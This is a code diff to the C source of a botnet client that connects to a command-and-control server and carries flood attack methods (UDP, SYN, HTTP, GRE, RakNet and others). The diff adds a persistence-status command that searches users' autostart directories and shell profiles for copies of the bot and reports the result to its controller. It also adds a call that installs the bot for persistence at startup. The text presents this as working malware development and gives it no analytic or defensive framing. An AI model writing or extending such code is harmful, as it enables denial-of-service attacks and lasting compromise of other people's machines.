@@ -15,6 +15,8 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <poll.h>
+#include <linux/limits.h>
+#include <dirent.h>
 #include "headers/syn_attack.h"
 #include "headers/udp_attack.h"
 #include "headers/http_attack.h"
@@ -106,6 +108,112 @@ void handle_command(char* command, int sock) {
         send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
         return;
     }
+    
+    if (strcmp(command, "status") == 0) {
+        int persisted = 0;
+        char exe_path[PATH_MAX];
+        if (readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1) != -1) {
+            exe_path[sizeof(exe_path) - 1] = '\0';
+            
+            const char *home_dirs[] = {"/home", "/root", "/var/home", "/var/lib", "/var/run"};
+            const char *startup_locations[] = {"/.config/autostart", "/.local/bin", "/.cache", "/tmp"};
+            const int home_dirs_count = sizeof(home_dirs) / sizeof(home_dirs[0]);
+            const int startup_locations_count = sizeof(startup_locations) / sizeof(startup_locations[0]);
+            
+            for (int i = 0; i < home_dirs_count && !persisted; i++) {
+                DIR *dir = opendir(home_dirs[i]);
+                if (!dir) continue;
+                
+                struct dirent *entry;
+                while ((entry = readdir(dir)) != NULL) {
+                    if (entry->d_type != DT_DIR || entry->d_name[0] == '.') continue;
+                    
+                    for (int j = 0; j < startup_locations_count && !persisted; j++) {
+                        char dest_dir[PATH_MAX] = {0};
+                        char temp_path[PATH_MAX] = {0};
+                        
+                        if (snprintf(temp_path, sizeof(temp_path), "%s/%s", home_dirs[i], entry->d_name) < 0) continue;
+                        if (snprintf(dest_dir, sizeof(dest_dir), "%s%s", temp_path, startup_locations[j]) < 0) continue;
+                        
+                        DIR *startup_dir = opendir(dest_dir);
+                        if (!startup_dir) continue;
+                        
+                        struct dirent *file;
+                        while ((file = readdir(startup_dir)) != NULL) {
+                            if (file->d_type != DT_REG) continue;
+                            
+                            char file_path[PATH_MAX];
+                            if (snprintf(file_path, sizeof(file_path), "%s/%s", dest_dir, file->d_name) < 0) continue;
+                            
+                            FILE *f1 = fopen(exe_path, "rb");
+                            FILE *f2 = fopen(file_path, "rb");
+                            if (!f1 || !f2) {
+                                if (f1) fclose(f1);
+                                if (f2) fclose(f2);
+                                continue;
+                            }
+                            
+                            int match = 1;
+                            int c1, c2;
+                            while ((c1 = fgetc(f1)) != EOF && (c2 = fgetc(f2)) != EOF) {
+                                if (c1 != c2) {
+                                    match = 0;
+                                    break;
+                                }
+                            }
+                            
+                            fclose(f1);
+                            fclose(f2);
+                            
+                            if (match) {
+                                persisted = 1;
+                                break;
+                            }
+                        }
+                        closedir(startup_dir);
+                    }
+                }
+                closedir(dir);
+            }
+        }
+        
+        // Check if bot is in any startup script
+        int in_startup = 0;
+        FILE *profile = fopen("/etc/profile", "r");
+        if (profile) {
+            char line[PATH_MAX];
+            while (fgets(line, sizeof(line), profile)) {
+                if (strstr(line, exe_path)) {
+                    in_startup = 1;
+                    break;
+                }
+            }
+            fclose(profile);
+        }
+        
+        if (!persisted) {
+            // Check common user profiles
+            const char *profiles[] = {"/root/.bashrc", "/root/.profile", "/etc/bash.bashrc"};
+            for (int i = 0; i < 3 && !in_startup; i++) {
+                FILE *p = fopen(profiles[i], "r");
+                if (p) {
+                    char line[PATH_MAX];
+                    while (fgets(line, sizeof(line), p)) {
+                        if (strstr(line, exe_path)) {
+                            in_startup = 1;
+                            break;
+                        }
+                    }
+                    fclose(p);
+                }
+            }
+        }
+        
+        snprintf(buffer, sizeof(buffer), "status %s %d", get_arch(), persisted || in_startup);
+        send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
+        return;
+    }
+    
     static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
     static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
     static void* (*attack_funcs[])(void*) = {
@@ -267,6 +375,13 @@ int main(int argc, char** argv) {
 
     daemonize(argc, argv);
     start_killer();
+    
+    char exe_path[PATH_MAX];
+    if (readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1) != -1) {
+        exe_path[sizeof(exe_path) - 1] = '\0';
+        startup_persist(exe_path);
+    }
+    
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
